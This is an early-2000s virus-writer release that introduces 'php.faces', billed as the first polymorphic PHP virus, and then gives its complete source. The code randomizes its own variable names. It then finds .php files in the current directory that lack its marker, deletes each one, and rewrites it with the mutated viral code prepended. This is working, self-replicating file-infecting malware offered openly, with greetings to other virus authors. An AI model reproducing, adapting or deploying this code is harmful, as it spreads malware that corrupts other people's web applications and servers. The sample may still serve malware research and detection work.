
                                                                      -php.faces
                                                (c) by kefi, early October, 2003

  .faces is the first polymorphic php virus.  it uses the never-before-seen poly
  engine, "kppe," which stands for "kefi's php polymorph engine."  faces is like
  most other  php viruses in it's "main code" where  it finds victim  files with
  the  extension of "php" from the  current directory  which do  not contain the
  string,  "php.faces."  if the file  contains the string, it  will  be skipped,
  however, if  it does  not, faces  will add it's newly  morphed 1,240  bytes of
  code to the beginning  of the victim file.

  .written as a lame "concept virus," so everything's simple and  easy ... as it
  should be. =)

  .thanks
  Negral -- php.Zodar; I based my code off of it.
  Xmorfic and Ultras -- very nice php viruses (php.ALF and NewWord)!
  Symantec -- giving  horrible reports (as usual) of every php  virus out there.
              keep up the good work, guys!

  .-------------------------------[php.faces]--------------------------------.

<?php
 $ypxqrpsqcc = fopen(__FILE__, "r");
 $bbugesqpty = substr(fread($ypxqrpsqcc, filesize(__FILE__)), 0, 1249);
 fclose($ypxqrpsqcc);
 $dhbpgxtamn = array("ypxqrpsqcc", "bbugesqpty", "dhbpgxtamn", "cctsvcopcx", "wurwejtvjx",
 "ccznwozuuo", "uudxleoyja", "ionwdbkwfh", "zohqscoxob", "skzmabzbfe");
 for($cctsvcopcx = 0; $cctsvcopcx < count($dhbpgxtamn); $cctsvcopcx++){
  $wurwejtvjx = chr(rand(97, 122));
  for($ccznwozuuo = 0; $ccznwozuuo < 9; $ccznwozuuo++)  $wurwejtvjx = $wurwejtvjx . chr(rand(97, 122));
  $bbugesqpty = str_replace("$dhbpgxtamn[$cctsvcopcx]", "$wurwejtvjx", "$bbugesqpty");
 }
 $uudxleoyja = opendir(".");
 while(false !== ($ionwdbkwfh = readdir($uudxleoyja))){
  if($ionwdbkwfh != "." && $ionwdbkwfh != ".."){
   if(substr($ionwdbkwfh, -3) == "php"){
    $zohqscoxob = fopen($ionwdbkwfh, "r"); 
     $skzmabzbfe = substr(fread($zohqscoxob, filesize($ionwdbkwfh)), 5);
    fclose($zohqscoxob);
    if(!strstr($skzmabzbfe, "php.faces")){
     unlink("$ionwdbkwfh");
     $zohqscoxob = fopen($ionwdbkwfh, "a+"); 
     fwrite($zohqscoxob, "$bbugesqpty");
     fwrite($zohqscoxob, "$skzmabzbfe");
     fclose($zohqscoxob);
    }
   }
  }
 }
 closedir($uudxleoyja);
 // php.faces  (c) by Kefi, 2003
?>
